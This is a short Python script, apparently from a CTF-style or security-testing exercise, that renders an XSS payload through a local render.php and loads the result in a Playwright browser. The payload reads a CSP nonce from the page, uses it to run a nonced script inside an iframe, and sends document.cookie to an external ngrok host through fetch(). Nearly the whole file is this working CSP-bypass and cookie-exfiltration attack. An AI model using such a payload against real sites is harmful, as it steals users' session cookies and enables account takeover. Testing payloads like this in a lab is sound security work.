#!/usr/bin/env python3
"""
Test if we can steal the nonce from parent and use it in iframe.
"""

import subprocess
import pathlib
from playwright.sync_api import sync_playwright

ROOT = pathlib.Path(__file__).resolve().parent.parent

# Payload that tries to read nonce from parent page script tags
payload = """<iframe id=f></iframe><script>
var n=document.querySelector('[nonce]').nonce;
f.srcdoc='<script nonce="'+n+'">fetch("https://fimbrillate-intersegmental-shelli.ngrok-free.dev/?c="+document.cookie)</s'+'cript>';
</script>"""

print(f"Testing payload: {payload}")
print()

# Render it
result = subprocess.run(
    ["php", str(ROOT / "render.php"), payload],
    check=True,
    capture_output=True,
)
html_path = ROOT / "test_nonce.html"
html_path.write_bytes(result.stdout)

print(f"Rendered to: {html_path}")
print()

# Open in browser
with sync_playwright() as p:
    browser = p.chromium.launch(headless=False)
    page = browser.new_page()
    page.on("console", lambda msg: print(f"[console] {msg.text}"))
    page.on("request", lambda req: print(f"[request] {req.url}"))

    page.goto(html_path.as_uri())
    page.wait_for_timeout(5000)
    browser.close()
